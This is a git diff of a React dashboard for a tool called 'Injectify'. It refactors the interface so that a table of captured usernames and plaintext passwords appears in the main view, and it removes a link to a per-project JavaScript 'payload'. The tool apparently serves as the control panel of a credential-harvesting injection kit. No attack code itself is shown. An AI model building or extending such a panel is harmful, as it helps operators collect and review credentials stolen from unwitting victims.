@@ -21,6 +21,8 @@ import Tooltip from 'material-ui/Tooltip';
 import Timestamp from 'react-timestamp';
 import ListSubheader from 'material-ui/List/ListSubheader';
 import SettingsIcon from 'material-ui-icons/Settings';
+import Paper from 'material-ui/Paper';
+import { LinearProgress } from 'material-ui/Progress';
 import Dialog, {
 	DialogActions,
 	DialogContent,
@@ -29,7 +31,7 @@ import Dialog, {
 } from 'material-ui/Dialog';
 import Table, { TableBody, TableCell, TableHead, TableRow } from 'material-ui/Table';
 
-const drawerWidth = 240;
+let drawerWidth = 240
 
 const styles = theme => ({
   root: {
@@ -51,6 +53,14 @@ const styles = theme => ({
       duration: theme.transitions.duration.leavingScreen,
     }),
   },
+  noshadow: {
+    boxShadow: 'none',
+  },
+  loading : {
+    top: 64,
+    width: '100%',
+    position: 'absolute',
+  },
   appBarShift: {
     width: `calc(100% - ${drawerWidth}px)`,
     transition: theme.transitions.create(['margin', 'width'], {
@@ -64,6 +74,8 @@ const styles = theme => ({
   },
   appBarHeader: {
     flex: '1',
+    cursor: 'pointer',
+    userSelect: 'none',
   },
   menuButton: {
     marginLeft: 12,
@@ -94,7 +106,8 @@ const styles = theme => ({
       easing: theme.transitions.easing.sharp,
       duration: theme.transitions.duration.leavingScreen,
     }),
-    height: 'calc(100% - 64px)',
+    height: 'calc(100% - 96px)',
+    overflow: 'scroll',
     marginTop: 64,
     [theme.breakpoints.up('sm')]: {
       content: {
@@ -115,6 +128,8 @@ const styles = theme => ({
 class PersistentDrawer extends Component {
   state = {
     open: false,
+    currentProject: null,
+    loading: false,
   };
 
   componentWillReceiveProps(nextProps) {
@@ -125,18 +140,38 @@ class PersistentDrawer extends Component {
         this.setState({ open: false })
       }
     }
+    if (nextProps.parentState.project !== this.props.parentState.project) {
+      this.loading(false)
+    }
+    this.setState({ currentProject: nextProps.parentState.project})
   }
 
   handleDrawerOpen = () => {
-    this.setState({ open: true });
+    this.setState({ open: true })
   }
 
   handleDrawerClose = () => {
-    this.setState({ open: false });
+    this.setState({ open: false })
+  }
+
+  returnHome = () => {
+    this.setState({ currentProject: null })
+    this.props.emit("project:close")
+  }
+
+  loading = value => {
+    this.setState({
+      loading: value
+    })
+  }
+
+  signOut = () => {
+    this.returnHome()
+    this.props.signOut()
   }
 
   render() {
-    const { classes, theme, signIn, signOut } = this.props;
+    const { classes, theme, signIn } = this.props;
     const { open } = this.state;
 
     const drawer = (
@@ -153,18 +188,17 @@ class PersistentDrawer extends Component {
               {theme.direction === 'rtl' ? <ChevronRightIcon /> : <ChevronLeftIcon />}
             </IconButton>
           </div>
-          <Projects projects={this.props.parentState.projects} projectData={this.props.parentState.project} emit={this.props.emit} classes={classes} token={this.props.token} />
+          <Projects projects={this.props.parentState.projects} projectData={this.props.parentState.project} emit={this.props.emit} classes={classes} token={this.props.token} loading={this.loading.bind(this)} />
         </div>
       </Drawer>
     )
-
     return (
       <div className={classes.root}>
         <div className={classes.appFrame}>
           <AppBar
-            className={classNames(classes.appBar, {
+            className={`${classNames(classes.appBar, {
               [classes.appBarShift]: open,
-            })}
+            })} ${this.state.loading ? classes.noshadow : ""}`}
           >
             <Toolbar className={classes.toolbar}>
               <IconButton
@@ -175,12 +209,12 @@ class PersistentDrawer extends Component {
               >
                 <MenuIcon />
               </IconButton>
-              <Typography type="title" color="inherit" noWrap className={classes.appBarHeader}>
-                Injectify
+              <Typography type="title" color="inherit" noWrap className={classes.appBarHeader} onClick={this.returnHome.bind(this)}>
+                  Injectify
               </Typography>
               {this.props.parentState.user.login ? (
-                  <Tooltip title="Logout" placement="bottom">
-                    <Button color="contrast" onClick={signOut} className="signed-in">
+                  <Tooltip title="Log out" placement="bottom">
+                    <Button color="contrast" onClick={this.signOut} className="signed-in">
                       {this.props.parentState.user.login}
                       <Avatar src={`${this.props.parentState.user.avatar_url}&s=40`} />
                     </Button>
@@ -193,14 +227,54 @@ class PersistentDrawer extends Component {
               }
             </Toolbar>
           </AppBar>
+          {this.state.loading ? (<LinearProgress className={classes.loading} /> ) : null}
           {drawer}
-          <main
-            className={classNames(classes.content, classes[`content`], {
-              [classes.contentShift]: open,
-            })}
-          >
-            {this.props.children}
-          </main>
+          {this.state.currentProject ? (
+                <main
+                  className={classNames(classes.content, classes[`content`], {
+                    [classes.contentShift]: open,
+                  })}
+                >
+                  <Paper>
+                    <Table>
+                      <TableHead>
+                        <TableRow>
+                          <TableCell width="400">Time</TableCell>
+                          <TableCell>Username</TableCell>
+                          <TableCell>Password</TableCell>
+                          <TableCell>Details</TableCell>
+                        </TableRow>
+                      </TableHead>
+                      <TableBody>
+                        {this.state.currentProject.passwords.map((record, i) => {
+                          return (
+                            <TableRow key={i}>
+                              <TableCell className="time"><Timestamp time={record.timestamp} format='ago'/></TableCell>
+                              <TableCell numeric>{record.username}</TableCell>
+                              <TableCell numeric>{record.password}</TableCell>
+                              <TableCell numeric>
+                                <Button color="primary" dense>
+                                  More
+                                </Button>
+                              </TableCell>
+                            </TableRow>
+                          );
+                        })}
+                        <tr ref={el => this.tableEnd = el} className="tableEnd"></tr>
+                      </TableBody>
+                    </Table>
+                  </Paper>
+                </main>
+              ) : (
+                <main
+                  className={classNames(classes.content, classes[`content`], {
+                    [classes.contentShift]: open,
+                  })}
+                >
+                  {this.props.children}
+                </main>
+            )
+          }
         </div>
       </div>
     );
@@ -224,7 +298,7 @@ class Projects extends Component {
           <Divider />
           <List className={classes.list} subheader={<ListSubheader>My projects</ListSubheader>}>
             {this.props.projects.map((project, i) =>
-              <Records raised color="primary" key={i} record={project.name} projectData={this.props.projectData} emit={this.props.emit} token={this.props.token}></Records>
+              <ProjectList raised color="primary" key={i} record={project.name} projectData={this.props.projectData} emit={this.props.emit} token={this.props.token} loading={this.props.loading}></ProjectList>
             )}
           </List>
         </div>
@@ -235,111 +309,22 @@ class Projects extends Component {
 	}
 }
 
-class Records extends Component {
-	state = {
-		open: false
-	}
-
-	componentWillUpdate() {
-		this.scrollToBottom()
-	}
-
-	componentDidUpdate() {
-		if (this.props.projectData) this.scrollToBottom()
-	}
-
+class ProjectList extends Component {
 	handleClickOpen = (a) => {
+    this.props.emit("project:close", {
+			name: this.props.record
+		})
 		this.props.emit("project:read", {
 			name: this.props.record
-		})
-		this.setState({ open: true });
-	};
-
-	handleRequestClose = () => {
-		this.props.emit("project:close", {
-			name: this.props.record
-		})
-		this.setState({ open: false });
-	}
-
-	scrollToBottom = (hide) => {
-		const node = ReactDOM.findDOMNode(this.scrollContainer)
-		if (node) {
-			setTimeout(() =>{
-				try {
-					node.scrollTo({
-						'behavior': 'smooth',
-						'left': 0,
-						'top': node.scrollHeight
-					});
-				} catch(e) {
-					node.scrollTop = node.scrollHeight
-				}
-			}, 0)
-		}
-	}
-
-	viewJS = () => {
-		window.open("/payload/?project=" + encodeURIComponent(this.props.projectData.name))
-	}
-
-	viewJSON = () => {
-		window.open("/api/" + encodeURIComponent(this.props.token) + "/" + encodeURIComponent(this.props.projectData.name) /*+ "&download=true"*/)
+    })
+    if (this.props.projectData && this.props.record !== this.props.projectData.name) this.props.loading(true)
 	}
 
 	render() {
 		return (
-			<div>
-        <ListItem button onClick={this.handleClickOpen}>
-          <ListItemText primary={this.props.record} />
-        </ListItem>
-				{this.props.projectData && this.props.projectData.name == this.props.record ? (
-					<Dialog open={this.state.open} onRequestClose={this.handleRequestClose}>
-						<DialogTitle>
-							<span>{`Project ${this.props.projectData.name}`}</span>
-						</DialogTitle>
-						<DialogContent ref={(el) => { this.scrollContainer = el }}>
-							<Table>
-								<TableHead>
-									<TableRow>
-										<TableCell width="400">Time</TableCell>
-										<TableCell>Username</TableCell>
-										<TableCell>Password</TableCell>
-										<TableCell>Details</TableCell>
-									</TableRow>
-								</TableHead>
-								<TableBody>
-									{this.props.projectData.passwords.map((record, i) => {
-										return (
-											<TableRow key={i}>
-												<TableCell className="time"><Timestamp time={record.timestamp} format='ago'/></TableCell>
-												<TableCell numeric>{record.username}</TableCell>
-												<TableCell numeric>{record.password}</TableCell>
-												<TableCell numeric>
-													<Button color="primary">
-														More
-													</Button>
-												</TableCell>
-											</TableRow>
-										);
-									})}
-									<tr ref={el => this.tableEnd = el} className="tableEnd"></tr>
-								</TableBody>
-							</Table>
-						</DialogContent>
-						<DialogActions>
-							<Tooltip title="Payload for this project" placement="left">
-								<Button onClick={this.viewJS} color="primary">
-									Javascript code
-								</Button>
-							</Tooltip>
-							<Button onClick={this.viewJSON} color="primary" autoFocus>
-								View JSON
-							</Button>
-						</DialogActions>
-					</Dialog>
-				) : null}
-			</div>
+      <ListItem button onClick={this.handleClickOpen}>
+        <ListItemText primary={this.props.record} />
+      </ListItem>
 		)
 	}
 }
